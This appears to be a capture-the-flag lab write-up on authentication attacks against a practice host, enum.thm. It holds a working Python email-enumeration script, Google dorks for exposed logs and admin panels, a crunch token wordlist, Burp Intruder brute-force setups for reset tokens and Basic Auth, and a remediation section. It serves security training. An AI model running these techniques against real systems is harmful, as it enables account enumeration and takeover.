# Enumeration & Brute Force - Lab Notes & Writeup

# 1. Reconnaissance & Enumeration

# Executive Summary & Scope

An assessment was conducted focusing on web application authentication mechanisms, session handling, password recovery workflows, and legacy login portals (such as HTTP Basic Authentication and predictable token schemes). The objective was to identify weak implementation patterns, leverage verbose error responses for user enumeration, and evaluate the resiliency of authentication endpoints against automated brute-force attacks and token prediction.

The engagement began with mapping the authentication attack surface, analyzing historical assets, and determining how applications handle identity verification and error states.

# Target Assessment & Environment Setup

  Host Configuration: Mapped the target VM IP address within /etc/hosts to point to enum.thm.

  Endpoint Discovery: Systematically identified open ports and web applications hosting credential submission forms, API functions, and authentication gates.

# Historical OSINT & Wayback Discovery

Before launching active scans, passive enumeration techniques were utilized to unearth hidden directories or forgotten administrative paths:

  Wayback URLs: Utilizing tools like waybackurls to query the Internet Archive's Wayback Machine helped extract historical endpoints and legacy files that might still linger on production servers.

# Google Dorking: 

Crafted specific advanced search operators to uncover exposed administrative directories, open log files, or directory indexes:

  Admin Panels: site:example.com inurl:admin

  Exposed Logs: filetype:log "password" site:example.com

  Backup Directories: intitle:"index of" "backup" site:example.com

# Error-Based Information Disclosure & User Enumeration

Interacting with application login portals (e.g., [http://enum.thm/labs/verbose_login/](http://enum.thm/labs/verbose_login/)) revealed critical logic flaws:

Verbose Responses: Entering an unregistered email yielded an "Email does not exist" error, whereas registered emails produced an "Invalid password" error. This differential feedback allows an attacker to compile a confirmed list of active users effortlessly.

# Automated Email Enumeration Script

A custom Python script was deployed to automate the enumeration of valid emails against the application's backend function (/labs/verbose_login/functions.php):

    import requests
    import sys
    
    def check_email(email):
        url = 'http://enum.thm/labs/verbose_login/functions.php'
        headers = {
            'Host': 'enum.thm',
            'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'http://enum.thm',
            'Referer': 'http://enum.thm/labs/verbose_login/',
        }
        data = {
            'username': email,
            'password': 'password',
            'function': 'login'
        }
        response = requests.post(url, headers=headers, data=data)
        return response.json()
    
    def enumerate_emails(email_file):
        valid_emails = []
        invalid_error = "Email does not exist"
        
        with open(email_file, 'r') as file:
            emails = file.readlines()
            
        for email in emails:
            email = email.strip()
            if email:
                response_json = check_email(email)
                if response_json.get('status') == 'error' and invalid_error in response_json.get('message', ''):
                    print(f"[INVALID] {email}")
                else:
                    print(f"[VALID] {email}")
                    valid_emails.append(email)
        return valid_emails
    
    if __name__ == "__main__":
        if len(sys.argv) != 2:
            print("Usage: python3 script.py <email_list_file>")
            sys.exit(1)
        valid_emails = enumerate_emails(sys.argv[1])
        print("\nValid emails found:")
        for ve in valid_emails:
            print(ve)

# 2. Exploitation

Leveraging enumeration insights, active exploitation was performed against password recovery flows, predictable tokens, and HTTP Basic Authentication mechanisms.

# Phase 1: Password Reset Token Prediction & Brute-Forcing

At [http://enum.thm/labs/predictable_tokens/](http://enum.thm/labs/predictable_tokens/), password reset requests generated weak tokens using a predictable random range (mt_rand(100, 200)), yielding a 3-digit numeric keyspace.

# Wordlist Generation: 

Used crunch to generate a precise numeric keyspace dictionary:

    crunch 3 3 -o otp.txt -t %%% -s 100 -e 200
  
Burp Suite Intruder Execution: Captured the password reset validation URL (?token=123), fed the generated otp.txt wordlist into Burp Intruder, and isolated the successful token via anomalous content-length responses to successfully reset the administrator's password.

<img width="1934" height="768" alt="image" src="https://github.com/user-attachments/assets/76f84900-51ef-4dbd-9e5b-2553d8b86941" />

# Phase 2: HTTP Basic Authentication Brute-Forcing

Evaluated endpoints utilizing HTTP Basic Authentication (RFC 7617), which encodes credentials as base64 strings (username:password) within the Authorization header.

Intruder Setup: Intercepted the Basic Auth pop-up request and sent it to Burp Intruder.

  Payload & Processing Rules Configuration:

  Rule 1 (Add Prefix): Automatically combined the username with the password payload from the list (e.g., transforming 123456 into admin:123456).

  Rule 2 (Base64 Encode): Encoded the combined string into base64 format.

  Character Exclusion: Removed padding characters (=) from base64 payload encoding rules.

Execution: Running the attack against a common credentials wordlist (500-worst-passwords.txt) successfully returned a 200 OK status code upon matching the correct password string.

# 3. Remediation

| Vulnerability | Severity | Description & Impact |
| :--- | :--- | :--- |
| **User Enumeration via Verbose Errors** | Medium | Differential error responses (`"Email does not exist"` vs. `"Invalid password"`) allowed attackers to isolate active accounts. |
| **Predictable Password Reset Tokens** | Critical | Password reset tokens relied on a weak random number range (`100–200`), allowing rapid brute-forcing and account takeover. |
| **Insecure HTTP Basic Authentication Transport** | High | Base64-encoded credentials transmitted over non-HTTPS connections or subjected to brute-force attacks enabled unauthorized administrative access. |
| **Absence of Rate Limiting & Throttling** | High | Lack of request throttling permitted automated, high-speed credential stuffing and token brute-forcing attacks. |

Standardize Error Messages: Ensure authentication failure messages are uniform (e.g., "Invalid username or password") to prevent user enumeration.

Cryptographically Secure Tokens: Implement robust, cryptographically secure random token generators (minimum 32 characters) with short expiration windows for password resets.

Enforce TLS/HTTPS & Modern Auth: Globally enforce HTTPS and transition away from static HTTP Basic Authentication, adopting token-based frameworks (such as OAuth 2.0 / OpenID Connect) where feasible.

Implement Rate Limiting & Lockout: Deploy strict IP rate limiting, account lockout thresholds, and CAPTCHA mechanisms to neutralize automated brute-force attempts.
